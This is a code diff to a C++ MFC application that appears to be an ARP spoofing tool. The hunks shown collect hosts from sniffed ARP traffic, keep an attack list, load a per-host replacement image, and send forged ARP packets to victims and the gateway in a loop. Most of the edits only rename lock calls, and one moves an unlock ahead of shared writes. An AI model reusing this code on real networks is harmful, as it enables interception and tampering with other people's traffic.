@@ -243,15 +243,17 @@ void CARPTestDlg::OnBnClickedButton2()
 			if (res == 0) // timeout
 				continue;
 			const ARPPacket* pak = (const ARPPacket*)pkt_data;
-			if (pak->type != PROTOCOL_ARP || pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST) // not ARP
+			if (pak->type != PROTOCOL_ARP
+				|| (pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST)
+				|| pak->senderIp == 0) // not ARP
 				continue;
-			g_hostAttackListLock.Lock();
+			g_hostAttackListLock.lock();
 			if (g_host.find(pak->senderIp) != g_host.end()) // not in g_host
 			{
-				g_hostAttackListLock.Unlock();
+				g_hostAttackListLock.unlock();
 				continue;
 			}
-			g_hostAttackListLock.Unlock();
+			g_hostAttackListLock.unlock();
 
 			// add to list
 			if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
@@ -268,11 +270,11 @@ void CARPTestDlg::OnBnClickedButton2()
 				m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
 			}
 			// add to g_host
-			g_hostAttackListLock.Lock();
+			g_hostAttackListLock.lock();
 			HostInfoSetting& host = g_host[pak->senderIp];
+			g_hostAttackListLock.unlock();
 			host.ip = pak->senderIp;
 			host.mac = pak->senderMac;
-			g_hostAttackListLock.Unlock();
 
 			if (pak->senderIp == g_selfGateway)
 				g_gatewayMac = pak->senderMac;
@@ -300,9 +302,9 @@ void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 		if ((pNMLV->uNewState & LVIS_SELECTED) != 0)
 		{
 			DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
-			g_hostAttackListLock.Lock();
+			g_hostAttackListLock.lock();
 			HostInfoSetting& host = g_host[ip];
-			g_hostAttackListLock.Unlock();
+			g_hostAttackListLock.unlock();
 
 			m_cheatTargetCheck.SetCheck(host.cheatTarget);
 			m_cheatGatewayCheck.SetCheck(host.cheatGateway);
@@ -331,7 +333,7 @@ void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 	// Now checked holds the new check box state
 
 	DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
-	g_hostAttackListLock.Lock();
+	g_hostAttackListLock.lock();
 	if (checked != 0)
 	{
 		HostInfoSetting& host = g_host[ip];
@@ -343,7 +345,7 @@ void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 		g_attackList.erase(ip);
 		g_attackListMac.erase(g_host[ip].mac);
 	}
-	g_hostAttackListLock.Unlock();
+	g_hostAttackListLock.unlock();
 }
 
 HostInfoSetting* CARPTestDlg::GetCurSelHost(int& index)
@@ -353,9 +355,9 @@ HostInfoSetting* CARPTestDlg::GetCurSelHost(int& index)
 		return nullptr;
 	index = m_hostList.GetNextSelectedItem(pos);
 	DWORD ip = (DWORD)m_hostList.GetItemData(index);
-	g_hostAttackListLock.Lock();
+	g_hostAttackListLock.lock();
 	HostInfoSetting* res = &g_host[ip];
-	g_hostAttackListLock.Unlock();
+	g_hostAttackListLock.unlock();
 	return res;
 }
 
@@ -425,7 +427,7 @@ void CARPTestDlg::OnEnKillfocusEdit1()
 
 	// read image
 	CFile f;
-	host->imageDataLock.Lock();
+	host->imageDataLock.lock();
 	if (f.Open(host->imagePath, CFile::modeRead | CFile::typeBinary))
 	{
 		host->imageDataLen = (DWORD)f.GetLength();
@@ -438,7 +440,7 @@ void CARPTestDlg::OnEnKillfocusEdit1()
 		host->imageData.reset();
 		MessageBox("Failed to load the image.");
 	}
-	host->imageDataLock.Unlock();
+	host->imageDataLock.unlock();
 }
 
 // update status
@@ -490,7 +492,7 @@ void CARPTestDlg::OnBnClickedButton1()
 		while (g_attacking)
 		{
 			DWORD time = GetTickCount();
-			g_hostAttackListLock.Lock();
+			g_hostAttackListLock.lock();
 			for (const auto& i : g_attackList)
 			{
 				if (i.second->cheatTarget) // send to target
@@ -506,7 +508,7 @@ void CARPTestDlg::OnBnClickedButton1()
 					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
 				}
 			}
-			g_hostAttackListLock.Unlock();
+			g_hostAttackListLock.unlock();
 			Sleep(1000 - (GetTickCount() - time));
 		}
 
@@ -516,7 +518,7 @@ void CARPTestDlg::OnBnClickedButton1()
 		packetHandleThread.join();
 
 		// recover
-		g_hostAttackListLock.Lock();
+		g_hostAttackListLock.lock();
 		for (const auto& i : g_attackList)
 		{
 			// send to target
@@ -528,7 +530,7 @@ void CARPTestDlg::OnBnClickedButton1()
 			packet.SetTarget(g_selfGateway, g_gatewayMac);
 			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
 		}
-		g_hostAttackListLock.Unlock();
+		g_hostAttackListLock.unlock();
 
 		// end
 		m_attackButton.SetWindowText("start");
